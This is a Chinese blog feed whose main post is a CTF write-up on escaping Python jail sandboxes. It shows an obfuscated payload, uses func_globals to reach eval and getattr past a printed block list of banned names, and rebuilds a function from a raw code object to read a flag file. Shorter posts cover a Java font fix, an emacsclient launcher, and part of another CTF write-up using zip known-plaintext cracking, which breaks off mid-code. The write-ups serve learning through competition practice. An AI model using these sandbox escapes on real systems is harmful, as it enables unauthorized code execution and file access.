~(~(~(~((~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(((((~((&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~((~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~(~(~(~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ((((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~(~(~((~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % (~(~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(((((~((&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~((~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~(~(~((~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~((~(((~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % (~(~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~(~(~((~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ((~(~(~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(((((~((&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~((~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ((~(~(~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % (~(~((~((~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(~((~(~(~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % (~(((~(~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))+`'%\xcb'`[&#123;&#125;&lt;[]::~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))] % ~(((~((~(~(&#123;&#125;&lt;[])&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))&lt;&lt;(&#123;&#125;&lt;[]))"</span></span><br></pre></td></tr></table></figure><p>把这堆不忍直视的玩意儿作为 get_flag 的参数传过去, 就能得到 flag 了</p><h2 id="大概是官方没想到的解法"><a href="#大概是官方没想到的解法" class="headerlink" title="大概是官方没想到的解法"></a>大概是官方没想到的解法</h2><p>我当时用的不是 <code>我猜想的标准解法</code> 那文章太硬核了看着就怕.</p><p>当时我是通过 <code>get_flag.func_gloabals</code>, 发现了一些有趣的东西</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> get_flag.func_globals</span><br><span class="line">&#123;'PseudoFile': &lt;class '__main__.PseudoFile'&gt;, 'code': &lt;module 'code' from '/usr/lib/python2.7/code.pyc'&gt;, 'bad': ['__class__', '__base__', '__subclasses__', '_module', 'open', 'eval', 'execfile', 'exec', 'type', 'lambda', 'getattr', 'setattr', '__', 'file', 'reload', 'compile', 'builtins', 'os', 'sys', 'system', 'vars', 'getattr', 'setattr', 'delattr', 'input', 'raw_input', 'help', 'open', 'memoryview', 'eval', 'exec', 'execfile', 'super', 'file', 'reload', 'repr', 'staticmethod', 'property', 'intern', 'coerce', 'buffer', 'apply'], '__builtins__': &lt;module '?' (built-in)&gt;, '__file__': '/home/app/problem.py', 'execfile': &lt;built-in function execfile&gt;, '__package__': None, 'sys': &lt;module 'sys' (built-in)&gt;, 'getattr': &lt;built-in function getattr&gt;, 'Shell': &lt;class __main__.Shell at 0x7fa31706bc80&gt;, 'banned': ['vars', 'getattr', 'setattr', 'delattr', 'input', 'raw_input', 'help', 'open', 'memoryview', 'eval', 'exec', 'execfile', 'super', 'file', 'reload', 'repr', 'staticmethod', 'property', 'intern', 'coerce', 'buffer', 'apply'], 'InteractiveConsole': &lt;class code.InteractiveConsole at 0x7fa31706bc18&gt;, 'eval': &lt;built-in function eval&gt;, 'get_flag': &lt;function get_flag at 0x7fa31707b8c0&gt;, '__name__': '__main__', 'main': &lt;function main at 0x7fa31708e410&gt;, '__doc__': None, 'print_function': _Feature((2, 6, 0, 'alpha', 2), (3, 0, 0, 'alpha', 0), 65536)&#125;</span><br></pre></td></tr></table></figure><p>加上 <code>.keys()</code> 可能更清晰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_flag.func_globals.keys()</span><br><span class="line">[<span class="string">'PseudoFile'</span>, <span class="string">'code'</span>, <span class="string">'bad'</span>, <span class="string">'__builtins__'</span>, <span class="string">'__file__'</span>, <span class="string">'execfile'</span>, <span class="string">'__package__'</span>, <span class="string">'sys'</span>, <span class="string">'getattr'</span>, <span class="string">'Shell'</span>, <span class="string">'banned'</span>, <span class="string">'InteractiveConsole'</span>, <span class="string">'eval'</span>, <span class="string">'get_flag'</span>, <span class="string">'__name__'</span>, <span class="string">'main'</span>, <span class="string">'__doc__'</span>, <span class="string">'print_function'</span>]</span><br></pre></td></tr></table></figure><p>可以看到这个地方有大量有趣的玩意儿. 比如利用 eval, 可以绕过对双下划线的过滤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = get_flag.func_globals.values()[<span class="number">12</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e(<span class="string">'&#123;&#125;.##class##.##bases##[0]'</span>.replace(<span class="string">'#'</span>, <span class="string">'_'</span>))</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br></pre></td></tr></table></figure><p>利用 getattr, 可以直接获取 file object</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>builtin=locals().values()[<span class="number">0</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>gattr=get_flag.func_globals.values()[<span class="number">8</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>gattr(builtin, <span class="string">'fi'</span><span class="string">'le'</span>)</span><br><span class="line">&lt;type <span class="string">'file'</span>&gt;</span><br></pre></td></tr></table></figure><p>然后就变得和套路题一样了...</p><h1 id="The-Abyss"><a href="#The-Abyss" class="headerlink" title="The Abyss"></a>The Abyss</h1><p>这道题没被 patch 之前是很简单的, 直接 <code>reload(locals().values()[0])</code> 重新加载builtin模块, 就能愉快地 import 了. 可惜后来被 patch 了, 难度陡增.(话说上一题其实也 patch 过, 然而并没有什么变化...)</p><p>被 patch 以后我看着这道题是非常懵逼的, 没有双下划线, 没有getattr, eval, exec, execfile, reload, input等函数.<br>builtin 也被清理得很彻底, 无从下手大概说的就是这种感觉. <del>于是我就放弃了</del></p><p>但后来在写另一道题时, 突然搜到了一篇惊为天人的文章(可谓有心栽花花不开, 无心插柳柳成荫啊).<br><a href="http://pbiernat.blogspot.com/2014/09/bypassing-python-sandbox-by-abusing.html" target="_blank" rel="noopener">bypassing-python-sandbox-by-abusing</a></p><p>核心思路是: 既然Python是一门面向对象的语言, 数字是对象, 字符串是对象, 连函数也是对象. 那么, 我们为何不通过直接初始化一个函数对象的方法来构造出一个函数, 从而绕过关键词过滤呢?<br>(有点元编程的赶脚)</p><p>首先我们拿出经典的绕过语句, 在本地编写一个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br></pre></td></tr></table></figure><p>然后通过 <code>function = type(foo)</code>, 可以拿到 function 类.</p><p>看看这个类是怎么实例化的.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [  ]: function?</span><br><span class="line">Docstring:</span><br><span class="line">function(code, globals[, name[, argdefs[, closure]]])</span><br><span class="line"></span><br><span class="line">Create a function object from a code object and a dictionary.</span><br><span class="line">The optional name string overrides the name from the code object.</span><br><span class="line">The optional argdefs tuple specifies the default argument values.</span><br><span class="line">The optional closure tuple supplies the bindings for free variables.</span><br><span class="line">Type:      type</span><br></pre></td></tr></table></figure><p>可以发现想要实例化这个类我们至少需要两个玩意儿, 一个 code object, 一个 globals(该怎么称呼这玩意儿呢...全局作用域?<br>globals 可以沿用全局的. 那么就只差一个 code object 了.</p><p>通过 <code>code = type(foo.func_code)</code> 可以得到一个 code 类, 看看参数:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [  ]: code?</span><br><span class="line">Docstring:</span><br><span class="line">code(argcount, nlocals, stacksize, flags, codestring, constants, names,</span><br><span class="line">      varnames, filename, name, firstlineno, lnotab[, freevars[, cellvars]])</span><br><span class="line"></span><br><span class="line">Create a code object.  Not for the faint of heart.</span><br><span class="line">Type:      type</span><br></pre></td></tr></table></figure><p>wow, 好多参数. 具体含义可以到 <a href="https://docs.python.org/2/reference/datamodel.html看" target="_blank" rel="noopener">https://docs.python.org/2/reference/datamodel.html看</a>.</p><p>不过这个地方不必关心这些参数的含义, 我们只要照抄就行了. 先全部打印出来:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">In [  ]: print(</span><br><span class="line">    ...:     foo.__code__.co_argcount,</span><br><span class="line">    ...:     foo.__code__.co_nlocals,</span><br><span class="line">    ...:     foo.__code__.co_stacksize,</span><br><span class="line">    ...:     foo.__code__.co_flags,</span><br><span class="line">    ...:     foo.__code__.co_code,</span><br><span class="line">    ...:     foo.__code__.co_consts,</span><br><span class="line">    ...:     foo.__code__.co_names,</span><br><span class="line">    ...:     foo.__code__.co_varnames,</span><br><span class="line">    ...:     foo.__code__.co_filename,</span><br><span class="line">    ...:     foo.__code__.co_name,</span><br><span class="line">    ...:     foo.__code__.co_firstlineno,</span><br><span class="line">    ...:     foo.__code__.co_lnotab,</span><br><span class="line">    ...:     foo.__code__.co_freevars,</span><br><span class="line">    ...:     foo.__code__.co_cellvars</span><br><span class="line">    ...: )</span><br><span class="line">(<span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">67</span>, <span class="string">'d\x02\x00j\x00\x00j\x01\x00d\x01\x00\x19j\x02\x00\x83\x00\x00S'</span>, (<span class="keyword">None</span>, <span class="number">0</span>, ()), (<span class="string">'__class__'</span>, <span class="string">'__bases__'</span>, <span class="string">'__subclasses__'</span>), (), <span class="string">'&lt;ipython-input-41-f6de0e4db9a4&gt;'</span>, <span class="string">'foo'</span>, <span class="number">1</span>, <span class="string">'\x00\x01'</span>, (), ())</span><br></pre></td></tr></table></figure><p>然后进行一些修改以绕过过滤, 就可以开始构造我们的函数了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="keyword">lambda</span> x: x <span class="comment"># 获取一个 function 对象</span></span><br><span class="line">function = type(f) <span class="comment"># 获取 function 类</span></span><br><span class="line">code = type(f.func_code) <span class="comment"># 获取 code 类</span></span><br><span class="line">codeobj = code(<span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">67</span>, <span class="string">'d\x02\x00j\x00\x00j\x01\x00d\x01\x00\x19j\x02\x00\x83\x00\x00S'</span>, (<span class="keyword">None</span>, <span class="number">0</span>, ()), (<span class="string">'_'</span><span class="string">'_class_'</span><span class="string">'_'</span>, <span class="string">'_'</span><span class="string">'_bases_'</span><span class="string">'_'</span>, <span class="string">'_'</span><span class="string">'_subclasses_'</span><span class="string">'_'</span>), (), <span class="string">'&lt;module&gt;'</span>, <span class="string">'foo'</span>, <span class="number">1</span>, <span class="string">'\x00\x01'</span>, (), ()) <span class="comment"># 实例化一个 code 对象</span></span><br><span class="line">foo = function(codeobj, globals()) <span class="comment"># 实例化一个 function 对象</span></span><br><span class="line"><span class="comment"># 现在已经在服务器上建立了一个我们的 foo 函数的拷贝了~</span></span><br></pre></td></tr></table></figure><p>然后执行 <code>foo()</code>, 就能获得大量棒棒的类.</p><p>试着执行 <code>fooo()[40]</code> , 果不其然得到了 file 类. 可以愉快地读取 flag.txt 了~</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>美国的高中生太可怕了...</p><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><a href="http://storage.aloxaf.cn/storage/Mirror Mirror.py" target="_blank" rel="noopener nofollow">Mirror Mirror.py</a><p><a href="http://storage.aloxaf.cn/storage/The Abyss.py" target="_blank" rel="noopener nofollow">The Abyss.py</a>&#39;</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;感谢 M4x 师傅推荐了这个比赛, 虽然是面向美国高中生, 不过打了以后还是有点收获的.&lt;br&gt;&lt;del&gt;同时内心受到一万点暴击伤害&lt;/del&gt; &lt;/p&gt;
&lt;p&gt;尤其是两道 Python jail, 非常硬却失挺.&lt;br&gt;(下载地址在文末)&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="https://www.aloxaf.com/categories/writeup/"/>
    
    
      <category term="ctf" scheme="https://www.aloxaf.com/tags/ctf/"/>
    
      <category term="writeup" scheme="https://www.aloxaf.com/tags/writeup/"/>
    
      <category term="python" scheme="https://www.aloxaf.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>解决 Arch Linux 下 BurpSuite 打开很丑的问题</title>
    <link href="https://www.aloxaf.com/2018/07/java_ugly_font/"/>
    <id>https://www.aloxaf.com/2018/07/java_ugly_font/</id>
    <published>2018-07-30T04:34:48.000Z</published>
    <updated>2018-07-30T04:34:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>好像很多 Java 程序都有这个毛病.<br>查了半天 Arch Wiki, 终于找到了: <a href="https://wiki.archlinux.org/index.php/Java_Runtime_Environment_fonts#Anti-aliasing" target="_blank" rel="noopener">Java Runtime Environment fonts</a></p><p>解决方案: 设置环境变量 <code>_JAVA_OPTIONS=&#39;-Dawt.useSystemAAFontSettings=on&#39;</code><br>(这么重要的东西怎么还要手动开启??)</p><p>直接在 <code>/etc/environment</code> 里加入这句然后重启即可</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;好像很多 Java 程序都有这个毛病.&lt;br&gt;查了半天 Arch Wiki, 终于找到了: &lt;a href=&quot;https://wiki.archlinux.org/index.php/Java_Runtime_Environment_fonts#Anti-aliasing&quot;
      
    
    </summary>
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux 下在打开方式中增加用 emacsclient</title>
    <link href="https://www.aloxaf.com/2018/07/add_open_by_emacsclient/"/>
    <id>https://www.aloxaf.com/2018/07/add_open_by_emacsclient/</id>
    <published>2018-07-26T00:42:30.000Z</published>
    <updated>2018-07-26T00:42:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>参考 <a href="http://liuyuanzhi.blogspot.com/2009/08/open-with-emacs-in-nautilus.html" target="_blank" rel="noopener">open-with-emacs-in-nautilus</a><br><a id="more"></a></p><ol><li><p>新建 <code>~/.local/share/applications/emacsclient.desktop</code></p></li><li><p>写入如下内容 </p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Desktop Entry]</span></span><br><span class="line"><span class="attr">Name</span>=Emacs Client</span><br><span class="line"><span class="attr">GenericName</span>=Text Editor</span><br><span class="line"><span class="attr">Comment</span>=Edit text</span><br><span class="line"><span class="attr">MimeType</span>=text/english;text/plain;text/x-makefile;text/x-c++hdr;text/x-c++src;text/x-chdr;text/x-csrc;text/x-java;text/x-moc;text/x-pascal;text/x-tcl;text/x-tex;application/x-shellscript;text/x-c;text/x-c++;</span><br><span class="line"><span class="attr">Exec</span>=emacsclient -n -a <span class="string">''</span> %F</span><br><span class="line"><span class="attr">Icon</span>=emacs</span><br><span class="line"><span class="attr">Type</span>=Application</span><br><span class="line"><span class="attr">Terminal</span>=<span class="literal">false</span></span><br><span class="line"><span class="attr">Categories</span>=Development;TextEditor;</span><br><span class="line"><span class="attr">StartupWMClass</span>=Emacs</span><br><span class="line"><span class="attr">Keywords</span>=Text;Editor;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考 &lt;a href=&quot;http://liuyuanzhi.blogspot.com/2009/08/open-with-emacs-in-nautilus.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;open-with-emacs-in-nautilus&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="linux" scheme="https://www.aloxaf.com/categories/linux/"/>
    
    
      <category term="linux" scheme="https://www.aloxaf.com/tags/linux/"/>
    
      <category term="emacs" scheme="https://www.aloxaf.com/tags/emacs/"/>
    
  </entry>
  
  <entry>
    <title>hackme.inndy 部分writeup</title>
    <link href="https://www.aloxaf.com/2018/07/hackme_inndy/"/>
    <id>https://www.aloxaf.com/2018/07/hackme_inndy/</id>
    <published>2018-07-14T07:00:07.000Z</published>
    <updated>2018-08-20T13:37:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>听奥博大佬说对新手很友好, 来试试</p><p>官方不建议直接给出 flag, 就不放 flag 了</p><a id="more"></a><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><blockquote><p>All flags are in this format:<br>FLAG{This is flag&#39;s format}</p></blockquote><p>RT</p><h2 id="corgi-can-fly"><a href="#corgi-can-fly" class="headerlink" title="corgi can fly"></a>corgi can fly</h2><blockquote><p>Corgi is cute, right?</p><p>Pillow (Python) and Bitmap (.NET) are your friends.</p><p>(Maybe you can try stegsolve)</p></blockquote><p><code>binwalk</code> 试试没啥玩意儿, <code>hexdump -C</code> 简单看一下,<br>发现末尾有一段可疑的base64字符串</p><p><code>echo RGlkIHlvdSB0cmllZCBMU0I/Cg==|base64 -d</code><br>decode 之, 得到字符串 <code>Did you tried LSB?</code></p><p>根据提示 LSB 走起, 得到二维码, 扫描之, 得到 flag</p><h2 id="television"><a href="#television" class="headerlink" title="television"></a>television</h2><blockquote><p>Looks like my television was broken</p></blockquote><p><code>binwalk</code> 试试没啥玩意儿, <code>hexdump -C</code> 简单看一下, 就发现了flag...</p><h2 id="meow"><a href="#meow" class="headerlink" title="meow"></a>meow</h2><blockquote><p>Pusheen is cute!</p></blockquote><p><code>binwalk</code> 试试好像有点玩意儿, <code>foremost meow.png</code> 提取一下, 得到一个 zip<br>和 png, 试着解压发现zip有密码, <code>unzip -v 00000094.zip</code><br>冷静分析一下这个zip</p><p>发现里面除了 flag 还有一个图片, crc32 值与开始得到的 png 一样. 显然明文攻击, pkcrack 走起.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zip plain.zip ../png/00000000.png</span><br><span class="line">pkcrack -C 00000094.zip -c meow/t39.1997-6/p296x100/10173502_279586372215628_1950740854_n.png -P plain.zip -p 00000000.png -d flag.zip -a</span><br><span class="line">x flag.zip</span><br><span class="line">cat flag/meow/flag</span><br></pre></td></tr></table></figure><h2 id="where-is-flag"><a href="#where-is-flag" class="headerlink" title="where is flag"></a>where is flag</h2><blockquote><p>Do you know regular expression?</p></blockquote><p>下载得到一个 flag.xz, <code>head -c 100</code> 看看解压得到的 flag 文件</p><p><code>wH3r3isFLAGc1oudyoufindit?qqajslfge7frHKFLAGcuonfsE4iJlrp9mCG[fl@g]eK4xdSgJpNuHP{z0ENPuio59R7nxpVgML</code></p><p>看起来 flag 藏在这个文件里面, 试试 <code>cat flag|grep -oP &quot;FLAG{[^{}]+?}&quot;</code>, 完全看不出flag......</p><p>于是选择了暴力...<br><code>cat flag|grep -oP &quot;FLAG{[^{}]+?}&quot;|xargs -P 5 -n 1 ./postflag.py</code></p><p>暴力找到 flag 后发现其实它还是有特征的 <code>FLAG{[0-9a-zA-Z]+}</code></p><h2 id="encoder"><a href="#encoder" class="headerlink" title="encoder"></a>encoder</h2><blockquote><p>Can you decode this?</p></blockquote><p>下载解压得到 encoder.py 和 flag.enc, 乍一看怀疑这题目真的没放错区吗</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 